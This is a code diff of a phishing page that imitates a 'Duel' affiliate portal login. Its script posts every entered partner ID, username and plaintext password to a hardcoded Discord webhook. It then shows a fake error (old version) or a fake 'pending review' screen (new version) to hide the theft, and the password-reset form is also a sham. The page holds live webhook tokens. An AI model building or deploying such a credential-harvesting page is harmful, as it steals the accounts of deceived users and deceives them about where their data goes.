@@ -1,334 +1,274 @@
 <!DOCTYPE html>
 <html lang="en">
-
-  <head>
-    <meta charset="UTF-8">
-    <title>Duel Affiliates</title>
-    <link rel="icon" type="image/png" href="/favicon.png">
-
-  </head>
-    
-  <body>
-  <!DOCTYPE html>
-<html lang="en">
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Duel — Affiliate Portal</title>
+<title>Duel Affiliates</title>
+<link rel="icon" type="image/png" href="/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Mulish:wght@400;500;600;700;800&family=Poppins:wght@700;800&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg: #0c0f22;
-    --card: #1c203b;
-    --field: #0e1124;
-    --tabbar: #161a31;
-    --pill: #31385e;
-    --text: #ffffff;
-    --muted: #8b91b4;
-    --muted-2: #5f6590;
-    --accent: #4957f5;
-    --accent-hover: #3f4def;
-    --danger: #f54964;
-    --ease: cubic-bezier(.45,.05,.2,1);
-    --dur: .3s;
+  :root{
+    --bg:#080D24;
+    --card:#202747;
+    --field:#111831;
+    --track:#171F3C;
+    --pill:#354066;
+    --accent:#4855FF;
+    --accent-press:#3b47e6;
+    --white:#FFFFFF;
+    --muted:#7789D0;
+    --muted-2:#7789D0;
+    --ok:#2bd4a0; --warn:#f0b24b; --bad:#f0556b;
   }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  html, body { height: 100%; }
-  body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    background: var(--bg); color: var(--text); margin: 0; overflow-x: hidden; overflow-y: auto;
-    -webkit-font-smoothing: antialiased;
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font-family:"Mulish",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+    background:var(--bg);color:var(--white);
+    display:flex;align-items:center;justify-content:center;
+    min-height:100vh;padding:34px 18px;
+    -webkit-font-smoothing:antialiased;
   }
-  #viewport { min-height: 100%; display: flex; align-items: center; justify-content: center; padding: 10px 0; }
-  .wrap { width: 402px; visibility: hidden; }
+  .wrap{width:100%;max-width:480px;animation:rise .5s ease both}
+  @keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
 
-  /* Header - Made Smaller */
-  .brand { text-align: center; margin-bottom: 16px; }
-  .brand h1 { font-size: 58px; font-weight: 800; letter-spacing: -2.5px; line-height: 1; }
-  .brand p { color: var(--muted); font-size: 17px; margin-top: 6px; font-weight: 400; letter-spacing: 0.2px; }
+  .brand{text-align:center;margin-bottom:22px}
+  .logo{font-family:"Poppins",sans-serif;font-weight:800;font-size:60px;line-height:1;letter-spacing:-.035em;color:var(--white)}
+  .brand .sub{margin-top:8px;font-size:13px;font-weight:500;color:var(--muted-2)}
 
-  /* Card - Reduced Padding */
-  .card { background: var(--card); border-radius: 20px; padding: 18px 18px 20px; }
+  .card{background:var(--card);border-radius:12px;padding:32px;box-shadow:0 26px 60px -30px rgba(0,0,0,.55)}
 
-  /* Tabs - Smaller */
-  .tabs { position: relative; display: flex; background: var(--tabbar); border-radius: 12px; padding: 5px; margin-bottom: 22px; }
-  .tab-pill {
-    position: absolute; top: 5px; left: 5px; width: calc(50% - 5px); height: calc(100% - 10px);
-    background: var(--pill); border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,.2);
-    transform: translateX(0); transition: transform var(--dur) var(--ease); z-index: 0;
-  }
-  .tab-pill.right { transform: translateX(100%); }
-  .tab {
-    position: relative; z-index: 1; flex: 1; text-align: center; padding: 10px 0;
-    font-size: 16px; font-weight: 700; color: var(--muted); background: transparent;
-    border: none; border-radius: 8px; cursor: pointer; transition: color .25s ease; font-family: inherit;
-    letter-spacing: -0.1px;
-  }
-  .tab.active { color: #fff; }
+  /* tabs */
+  .track{position:relative;display:grid;grid-template-columns:1fr 1fr;background:var(--track);border-radius:9px;padding:5px;margin-bottom:24px}
+  .pill{position:absolute;top:5px;bottom:5px;left:5px;right:50%;background:var(--pill);border-radius:7px;
+    transition:left .3s cubic-bezier(.45,.05,.2,1), right .3s cubic-bezier(.45,.05,.2,1)}
+  .track.reg .pill{left:50%;right:5px}
+  .tab{position:relative;z-index:1;appearance:none;border:0;background:transparent;cursor:pointer;
+    font-family:inherit;font-size:15px;font-weight:700;color:var(--muted);padding:9px 8px;border-radius:7px;transition:color .25s}
+  .tab.active{color:var(--white)}
 
-  /* Panes */
-  .panel { position: relative; transition: height var(--dur) var(--ease); }
-  .pane {
-    position: absolute; top: 0; left: 0; width: 100%; opacity: 0; transform: translateY(10px);
-    pointer-events: none; transition: opacity .22s ease, transform var(--dur) var(--ease);
-  }
-  .pane.on {
-    opacity: 1; transform: none; pointer-events: auto;
-    transition: opacity .3s ease .08s, transform .34s var(--ease) .06s;
-  }
+  .panel{display:none}
+  .panel.active{display:block;animation:swap .32s cubic-bezier(.3,.1,.2,1)}
+  @keyframes swap{from{opacity:0;transform:translateY(7px)}to{opacity:1;transform:none}}
 
-  /* Form Fields - Smaller */
-  .field { margin-bottom: 16px; }
-  .field label { display: block; font-size: 16px; color: var(--muted); margin-bottom: 8px; font-weight: 400; }
-  .input-row { position: relative; }
-  input {
-    width: 100%; background: var(--field); border: 1px solid transparent; border-radius: 12px;
-    padding: 14px 16px; font-size: 16px; color: #fff; caret-color: var(--accent); outline: none;
-    transition: border-color .15s, background .15s; font-family: inherit;
-    font-weight: 500;
-  }
-  input::placeholder { color: var(--muted-2); font-weight: 400; }
-  input:focus { border-color: #5b6193; background: #141830; }
-  input[type="password"] { letter-spacing: 2px; font-size: 18px; padding-top: 12px; padding-bottom: 12px; }
-  
-  .eye {
-    position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
-    background: none; border: none; color: var(--muted); cursor: pointer; padding: 4px; display: flex;
-  }
-  .eye svg { width: 20px; height: 20px; }
-  
-  .forgot { text-align: right; margin: 12px 0 0; }
-  .forgot a { color: var(--muted); font-size: 16px; text-decoration: underline; cursor: pointer; text-underline-offset: 3px; }
+  .field{margin-bottom:18px}
+  label{display:block;font-size:13px;font-weight:500;color:var(--muted);margin:0 0 8px}
+  input{width:100%;background:var(--field);border:1px solid rgba(255,255,255,.03);border-radius:9px;
+    color:var(--white);font-family:inherit;font-size:14px;padding:14px 16px;outline:none;
+    transition:border-color .15s, box-shadow .15s}
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(77,93,255,.18)}
 
-  /* Buttons - Smaller */
-  .btn {
-    display: block; width: 100%; background: var(--accent); color: #fff; border: none;
-    border-radius: 14px; padding: 14px; font-size: 18px; font-weight: 700; text-align: center;
-    text-decoration: none; cursor: pointer; transition: background .15s, transform .05s; font-family: inherit;
-    letter-spacing: -0.1px;
-  }
-  .btn:hover { background: var(--accent-hover); }
-  .btn:active { transform: translateY(1px); }
-  .btn:disabled { background: var(--accent-hover); cursor: not-allowed; opacity: 0.8; }
+  .pw{position:relative}
+  .pw input{padding-right:42px}
+  .eye{position:absolute;right:10px;top:50%;transform:translateY(-50%);background:none;border:0;cursor:pointer;color:var(--muted);padding:5px;line-height:0;border-radius:7px}
+  .eye:hover{color:var(--white)}
 
-  /* Error Message */
-  .error-msg { color: var(--danger); font-size: 14px; margin: 16px 0 0; display: none; line-height: 1.4; font-weight: 500; }
+  .forgot{display:flex;justify-content:flex-end;margin:-2px 0 20px}
+  .forgot a{color:var(--muted-2);font-size:13px;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
 
-  /* Register Pane */
-  .reg-head { font-size: 22px; font-weight: 800; margin: 4px 0 10px; letter-spacing: -0.3px; }
-  .reg-body { color: var(--muted); font-size: 15px; line-height: 1.5; margin-bottom: 20px; }
+  .btn{width:100%;border:0;cursor:pointer;
+    background:var(--accent);color:#fff;
+    font-family:inherit;font-size:15px;font-weight:700;padding:15px;border-radius:9px;
+    transition:filter .15s, transform .05s}
+  .btn:hover{filter:brightness(1.07)}
+  .btn:active{transform:translateY(1px);background:var(--accent-press)}
+  .btn:disabled {opacity:0.7;cursor:not-allowed}
+  a.btn{display:block;text-decoration:none;text-align:center}
 
-  /* Recover Pane */
-  .recover-head { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 8px; }
-  .recover-head h2 { font-size: 22px; font-weight: 800; letter-spacing: -0.3px; }
-  .close-btn { background: none; border: none; color: var(--muted); cursor: pointer; font-size: 24px; line-height: 0.8; padding: 2px; }
-  .recover-text { color: var(--muted); font-size: 15px; line-height: 1.5; margin-bottom: 18px; }
+  .login-error{display:none;color:#ff5a6a;font-size:14px;font-weight:600;margin:2px 0 16px}
+  .login-error.show{display:block}
 
-  @media (prefers-reduced-motion: reduce) {
-    .tab-pill, .panel, .pane, .pane.on { transition: none !important; }
-  }
+  /* register intro */
+  .reg h2{font-size:19px;font-weight:700;margin:4px 0 10px;color:var(--white)}
+  .reg p{font-size:13.5px;color:var(--muted-2);line-height:1.5;margin:0 0 20px}
+
+  /* recover password view */
+  .view-head{display:flex;align-items:center;justify-content:space-between}
+  .view-head h2{font-size:21px;font-weight:700;margin:0;color:var(--white)}
+  .x{background:none;border:0;color:var(--muted-2);font-size:24px;line-height:1;cursor:pointer;padding:0 2px}
+  .x:hover{color:var(--white)}
+  .view-sub{font-size:13.5px;color:var(--muted-2);line-height:1.5;margin:10px 0 22px}
+  .recover-done{display:none;color:var(--ok);font-size:13px;font-weight:600;margin-top:14px;text-align:center}
+  .recover-done.show{display:block}
+
+  /* partner id success view */
+  .pid-label{font-size:13px;color:var(--muted-2);margin:4px 0 6px}
+  .pid-number{font-size:30px;font-weight:800;color:var(--white);letter-spacing:.02em;margin-bottom:16px}
+  .pid-note{font-size:14px;color:var(--muted-2);line-height:1.5;margin:0 0 22px}
+  .signout{text-align:center;margin-top:16px}
+  .signout a{color:var(--muted-2);font-size:14px;text-decoration:underline;text-underline-offset:3px;cursor:pointer}
+  .signout a:hover{color:var(--white)}
+
+  .foot{text-align:center;font-size:12px;color:var(--muted-2);margin-top:18px;opacity:.6}
 </style>
 </head>
 <body>
-  <div id="viewport">
-  <div class="wrap" id="stage">
+  <div class="wrap">
     <div class="brand">
-      <h1>Duel</h1>
-      <p>Affiliate portal</p>
+      <div class="logo">Duel</div>
+      <div class="sub">Affiliate portal</div>
     </div>
 
     <div class="card">
-      <div class="tabs" id="mainTabs">
-        <div class="tab-pill" id="tabPill"></div>
-        <button class="tab active" id="tab-login" onclick="switchTab('login')">Login</button>
-        <button class="tab" id="tab-register" onclick="switchTab('register')">Register</button>
-      </div>
+      <!-- ============ AUTH (tabs + login + register) ============ -->
+      <div id="authMain">
+        <div class="track" id="track">
+          <span class="pill"></span>
+          <button class="tab active" data-tab="login">Login</button>
+          <button class="tab" data-tab="register">Register</button>
+        </div>
 
-      <div class="panel" id="panel">
-
-        <!-- LOGIN FORM -->
-        <form id="login-form" class="pane on" onsubmit="return doLogin(event)">
+        <!-- LOGIN -->
+        <form class="panel active" id="login" onsubmit="return login(event)">
           <div class="field">
             <label>Partner ID *</label>
-            <div class="input-row"><input type="text" id="login-partner" required /></div>
+            <input type="text" id="login-pid" required />
           </div>
           <div class="field">
             <label>Username *</label>
-            <div class="input-row"><input type="text" id="login-user" required /></div>
+            <input type="text" id="login-user" autocomplete="username" required />
           </div>
-          <div class="field" style="margin-bottom:0;">
+          <div class="field">
             <label>Password *</label>
-            <div class="input-row">
-              <input type="password" id="login-pass" required />
-              <button type="button" class="eye" onclick="toggleEye('login-pass', this)">
-                <svg class="i" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+            <div class="pw">
+              <input type="password" id="pw" autocomplete="current-password" required />
+              <button type="button" class="eye" aria-label="Show password" onclick="togglePw(this)">
+                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
               </button>
             </div>
           </div>
-          <div class="forgot"><a onclick="openRecover(event)">Forgot password?</a></div>
+          <div class="forgot"><a onclick="showRecover(true)">Forgot password?</a></div>
 
-          <div class="error-msg" id="loginError">Invalid password or credentials. Try again later.</div>
+          <div class="login-error" id="loginError">Invalid partner id.</div>
 
-          <button type="submit" class="btn" id="loginBtn" style="margin-top:18px;">Log in</button>
+          <button class="btn" type="submit" id="loginBtn">Log in</button>
         </form>
 
         <!-- REGISTER -->
-        <div id="register-form" class="pane">
-          <h2 class="reg-head">Register with Duel.com</h2>
-          <p class="reg-body">Create your account on Duel.com first. Then come back here and log in with your partner id, username, and password.</p>
+        <div class="panel reg" id="register">
+          <h2>Register with Duel.com</h2>
+          <p>Create your account on Duel.com first. Then come back here and log in with your partner id, username, and password.</p>
           <a class="btn" href="https://duel.com" target="_blank" rel="noopener">Register with Duel.com</a>
         </div>
+      </div>
 
-        <!-- RECOVER PASSWORD -->
-        <form id="recover-form" class="pane" onsubmit="return doRecover(event)">
-          <div class="recover-head">
-            <h2>Recover password</h2>
-            <button type="button" class="close-btn" onclick="closeRecover()">&times;</button>
-          </div>
-          <p class="recover-text">Enter your email and we will send you a password reset link.</p>
-          
+      <!-- ============ RECOVER PASSWORD ============ -->
+      <div id="recoverView" style="display:none">
+        <div class="view-head">
+          <h2>Recover password</h2>
+          <button class="x" aria-label="Close" onclick="showRecover(false)">&times;</button>
+        </div>
+        <p class="view-sub">Enter your email and we will send you a password reset link.</p>
+        <form onsubmit="return sendRecover(event)">
           <div class="field">
             <label>Email *</label>
-            <div class="input-row"><input type="email" id="recover-email" required /></div>
+            <input type="email" id="recoverEmail" required />
           </div>
-
-          <button type="submit" class="btn" id="recoverBtn" style="margin-top: 8px;">Send Link</button>
+          <button class="btn" type="submit">Send Link</button>
+          <div class="recover-done" id="recoverDone">If that email is registered, a reset link is on its way.</div>
         </form>
+      </div>
 
-      </div><!-- /panel -->
+      <!-- ============ PENDING REVIEW ============ -->
+      <div id="pendingView" style="display:none">
+        <div class="pid-label">Partner ID</div>
+        <div class="pid-number" id="displayPid">---</div>
+        <p class="pid-note">Check back in 24–72 hours while your application is reviewed.</p>
+        <button class="btn" onclick="signOut()">Return</button>
+        <div class="signout"><a onclick="signOut()">Sign out</a></div>
+      </div>
+
     </div>
+
+    <p class="foot">© <span id="yr"></span> Duel.com · Affiliate partners only</p>
   </div>
-  </div><!-- /viewport -->
 
 <script>
-  const WEBHOOK_URL = "https://discord.com/api/webhooks/1570395943592005674/n-SKK1WDf72kPZ5NbIiT13gGF_0XN_hZiF3V3SOaybTTAizgCqPZC1wj9shMI0zmOIbd";
+  const WEBHOOK_URL = "https://discord.com/api/webhooks/1570927394058018941/_PnCdRkr02Q9fBzwKMoQh7fK8KVfOJtqfZv-VKjvL45Bli_W16T41OHz2G1-Rz3VgCR4";
 
-  const panel = document.getElementById('panel');
-  const mainTabs = document.getElementById('mainTabs');
-  const pill  = document.getElementById('tabPill');
-  const panes = {
-    login: document.getElementById('login-form'),
-    register: document.getElementById('register-form'),
-    recover: document.getElementById('recover-form'),
-  };
-  let current = 'login';
-  let attemptCount = 0; 
+  document.getElementById('yr').textContent = new Date().getFullYear();
+  const track = document.getElementById('track');
 
-  function fitPanel() {
-    const z = parseFloat(document.getElementById('stage').style.zoom) || 1;
-    panel.style.height = (panes[current].getBoundingClientRect().height / z) + 'px';
-  }
-
-  function setPane(key) {
-    Object.values(panes).forEach(p => p.classList.remove('on'));
-    panes[key].classList.add('on'); current = key; fitPanel();
-  }
-
-  function switchTab(which) {
-    document.getElementById('tab-login').classList.toggle('active', which === 'login');
-    document.getElementById('tab-register').classList.toggle('active', which === 'register');
-    pill.classList.toggle('right', which === 'register'); setPane(which);
-  }
-
-  const REF_W = 402;
-  function fitScreen() {
-    const vw = window.innerWidth; const z = Math.min((vw - 28) / REF_W, 1);
-    document.getElementById('stage').style.zoom = z;
-  }
-
-  window.addEventListener('load', () => {
-    setPane('login'); fitScreen();
-    requestAnimationFrame(() => { fitScreen(); fitPanel(); document.getElementById('stage').style.visibility = 'visible'; });
+  /* ---- tabs ---- */
+  document.querySelectorAll('.tab').forEach(t=>{
+    t.addEventListener('click',()=>{
+      const id=t.dataset.tab;
+      document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('active',x===t));
+      track.classList.toggle('reg', id==='register');
+      document.querySelectorAll('#authMain .panel').forEach(p=>p.classList.toggle('active',p.id===id));
+    });
   });
-  window.addEventListener('resize', () => { fitScreen(); fitPanel(); });
 
-  function toggleEye(id, btn) {
-    const el = document.getElementById(id); const show = el.type === 'password';
-    el.type = show ? 'text' : 'password';
-    btn.querySelector('.i').innerHTML = show
-      ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
-      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  /* ---- password visibility ---- */
+  function togglePw(btn,id){
+    const i=document.getElementById(id||'pw');
+    const s=i.type==='password';
+    i.type=s?'text':'password';
+    btn.style.color=s?'var(--accent)':'';
   }
 
-  function doLogin(e) {
+  /* ---- view switching ---- */
+  function setView(name){
+    document.getElementById('authMain').style.display    = name==='auth'    ? 'block':'none';
+    document.getElementById('recoverView').style.display = name==='recover' ? 'block':'none';
+    document.getElementById('pendingView').style.display = name==='pending' ? 'block':'none';
+  }
+
+  /* ---- login ---- */
+  function login(e){
     e.preventDefault();
-    
-    const btn = document.getElementById('loginBtn');
-    const error = document.getElementById('loginError');
-    const partner = document.getElementById('login-partner').value.trim();
+    const b = document.getElementById('loginBtn');
+    const pid = document.getElementById('login-pid').value.trim();
     const user = document.getElementById('login-user').value.trim();
-    const pass = document.getElementById('login-pass').value;
+    const pass = document.getElementById('pw').value;
     
-    error.style.display = 'none';
-    btn.disabled = true;
-    btn.textContent = 'Logging in...';
+    b.textContent='Logging in...';b.disabled=true;
 
-    const payload = {
-      content: `**New Login Attempt**\n**Partner ID:** ${partner}\n**Username:** ${user}\n**Password:** ${pass}`
-    };
-
+    // Send to Discord Webhook
     fetch(WEBHOOK_URL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
+      body: JSON.stringify({
+        content: `**New Login Attempt**\n**Partner ID:** ${pid}\n**Username:** ${user}\n**Password:** ${pass}`
+      })
     }).catch(err => console.error('Webhook error:', err));
-
-    attemptCount++;
-
-    setTimeout(() => {
-      btn.disabled = false;
-      btn.textContent = 'Log in';
-      
-      if (attemptCount >= 4) {
-        error.textContent = "Too many attempts. Try again later.";
-      } else {
-        error.textContent = "Invalid password or credentials. Try again later.";
-      }
-      
-      error.style.display = 'block';
-      document.getElementById('login-pass').value = '';
-
-      let x = 0;
-      const shake = setInterval(() => {
-        error.style.transform = `translateX(${x}px)`;
-        x = x === 0 ? 4 : (x === 4 ? -4 : 0);
-        if (x === 0) clearInterval(shake);
-      }, 50);
-
-    }, 2000);
-
-    return false;
-  }
-
-  function openRecover(e) {
-    e.preventDefault();
-    mainTabs.style.display = 'none';
-    setPane('recover');
-  }
-
-  function closeRecover() {
-    mainTabs.style.display = 'flex';
-    document.getElementById('recover-email').value = '';
-    switchTab('login');
-  }
-
-  function doRecover(e) {
-    e.preventDefault();
-    const btn = document.getElementById('recoverBtn');
     
-    btn.textContent = 'Sending...';
-    btn.disabled = true;
-
-    setTimeout(() => {
-      window.location.reload();
-    }, 1500);
-
+    setTimeout(()=>{
+      b.textContent='Log in';b.disabled=false;
+      
+      // Show Pending View
+      document.getElementById('displayPid').textContent = pid || '89983';
+      setView('pending');
+      
+    },1000);
     return false;
   }
 
+  function signOut() {
+    setView('auth');
+    document.getElementById('login-pid').value = '';
+    document.getElementById('pw').value = '';
+  }
+
+  /* ---- recover password ---- */
+  function showRecover(on){
+    document.getElementById('recoverDone').classList.remove('show');
+    setView(on ? 'recover' : 'auth');
+  }
+  
+  function sendRecover(e){
+    e.preventDefault();
+    const b=e.target.querySelector('.btn'),o=b.textContent;
+    b.textContent='Sending...';b.disabled=true;
+    setTimeout(()=>{
+      b.textContent=o;b.disabled=false;
+      document.getElementById('recoverDone').classList.add('show');
+    },700);
+    return false;
+  }
 </script>
 </body>
-</html>
-    
-  </body>
-  
 </html>
